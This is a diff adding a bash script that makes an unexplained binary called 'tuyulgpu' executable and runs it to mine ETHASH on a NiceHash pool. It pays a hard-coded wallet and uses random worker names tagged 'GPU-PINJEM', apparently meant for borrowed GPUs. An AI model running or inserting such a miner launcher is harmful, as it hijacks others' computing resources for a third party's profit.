@@ -1,0 +1,11 @@
+#!/bin/bash
+
+POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
+
+WALLET=33LEeaRKvRzn62a9DxqLQfy68Az1thQtNp
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+
+chmod +x tuyulgpu
+
+./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
